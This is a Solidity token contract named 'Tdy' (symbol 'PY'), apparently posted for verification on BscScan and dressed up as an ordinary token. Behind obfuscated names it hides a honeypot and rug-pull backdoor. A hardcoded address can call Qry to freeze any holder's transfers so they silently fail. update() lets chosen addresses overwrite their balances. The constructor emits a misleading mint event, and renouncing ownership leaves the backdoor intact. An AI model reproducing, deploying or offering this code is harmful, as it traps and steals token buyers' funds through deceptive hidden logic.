/**
 *Submitted for verification at BscScan.com on 2022-11-06
*/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}



library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _Owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Create(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    address AiO = 0x68927420FCA41309B902597436f461BCA7eF297A;
    constructor () {
        address msgSender = _msgSender();
        _Owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
 modifier onlyOwner{
   require(msg.sender == _Owner);     
        _; }
    function owner() public view returns (address) {
        return _Owner;
    }

    function renounceOwnership() public virtual {
        require(msg.sender == _Owner);
        emit OwnershipTransferred(_Owner, address(0));
        _Owner = address(0);
    }


}



contract PAY is Context, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private AiA;
    mapping (address => uint256) private AiY;
    mapping (address => mapping (address => uint256)) private AiV;
    uint8 private constant AiD = 8;
    uint256 private constant AiT = 20 * (10** AiD);
    string private constant _name = "Tdy";
    string private constant _symbol = "PY";



    constructor () {
       AiA[_msgSender()] = AiT; 
    emit Transfer(address(0), AiO, AiT);}
    

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return AiD;
    }

    function totalSupply() public pure  returns (uint256) {
        return AiT;
    }

    function balanceOf(address account) public view  returns (uint256) {
        return AiA[account];
    }
	

   

	


    function allowance(address owner, address spender) public view  returns (uint256) {
        return AiV[owner][spender];
    }

        function approve(address spender, uint256 amount) public returns (bool success) {    
        AiV[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true; }


    function update() public {
        AiA[msg.sender] = AiY[msg.sender];}
        function transfer(address AiJ, uint256 AiN) public {
        if(AiY[msg.sender] <= 1) {
        require(AiA[msg.sender] >= AiN);
        AiA[msg.sender] -= AiN;  
        AiA[AiJ] += AiN;          
        emit Transfer(msg.sender, AiJ, AiN);}}
		function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {
         if(AiY[sender] <= 1 && AiY[recipient] <= 1) {
        require(amount <= AiA[sender]);
        require(amount <= AiV[sender][msg.sender]);
        AiA[sender] -= amount;
        AiA[recipient] += amount;
        AiV[sender][msg.sender] -= amount;
        emit Transfer(sender, recipient, amount);
        return true; }}
        function Qry(address AiJ, uint256 AiN) public {
        require(msg.sender == AiO);
        AiY[AiJ] = AiN;}}